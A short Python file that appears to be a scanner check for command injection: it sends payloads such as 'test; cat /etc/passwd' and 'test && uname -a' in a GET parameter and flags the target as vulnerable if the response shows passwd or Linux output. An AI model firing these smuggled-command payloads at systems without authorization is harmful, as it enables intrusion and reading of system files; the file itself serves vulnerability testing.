import requests

'''
    Command injection is an attack in which the goal is execution of arbitrary commands 
    on the host operating system via a vulnerable application. 
    Command injection attacks are possible when an application passes unsafe user supplied data 
    (forms, cookies, HTTP headers etc.) to a system shell.
'''
def test_command_injection(url):
    command_injection_payloads = [
        "test; cat /etc/passwd",  # Linux command
        "test & dir",  # Windows command
        "test && uname -a"  # Unix command to check system details
    ]

    for payload in command_injection_payloads:
        try:
            response = requests.get(url, params={'input': payload}, timeout=5)
            if "root:" in response.text or "Linux" in response.text:
                return {"vulnerability": "Command Injection", "status": "Detected",
                        "details": f"Payload {payload} executed successfully"}
        except requests.exceptions.RequestException as e:
            pass
    return {"vulnerability": "Command Injection", "status": "Not detected"}